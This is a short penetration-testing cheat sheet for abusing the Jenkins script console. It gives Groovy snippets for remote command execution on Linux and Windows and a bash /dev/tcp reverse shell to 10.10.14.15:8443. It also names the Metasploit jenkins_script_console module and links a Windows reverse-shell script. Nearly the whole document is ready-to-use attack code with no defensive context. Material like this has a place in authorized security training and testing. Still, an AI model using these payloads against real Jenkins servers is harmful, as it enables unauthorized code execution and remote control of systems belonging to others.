# Cheatsheet

| ***Command***                                                                                                                                                                                                   | ***Usage***                                                                                                     |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `http://<url>/script`                                                                                                                                                                                           | This endpoint allows the admin to run Groovy scripts. can be exploited for command execution or reverse shells. |
| ```groovy<br>def cmd = 'id'<br>def sout = new StringBuffer(), serr = new StringBuffer()<br>def proc = cmd.execute()<br>proc.consumeProcessOutput(sout, serr)<br>proc.waitForOrKill(1000)<br>println sout<br>``` | Groovy script for RCE (**Linux**).                                                                              |
| ```groovy<br>def cmd = "cmd.exe /c dir".execute();<br>println("${cmd.text}");<br>```                                                                                                                            | Groovy script for RCE (**Windows**).                                                                            |
| ```groovy<br>r = Runtime.getRuntime()<br>p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[])<br>p.waitFor()<br>```              | Groovy script for reverse shell.                                                                                |
| `multi/http/jenkins_script_console`                                                                                                                                                                             | Reverse shell using `metasploit`.                                                                               |
| [Revshell for Windows host](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)                                                          |                                                                                                                 |
# Related Pages
[Jenkins Enumeration](I.%20Enumeration/Web%20Enumeration/Common%20WebApps/Jenkins%20Enumeration.md)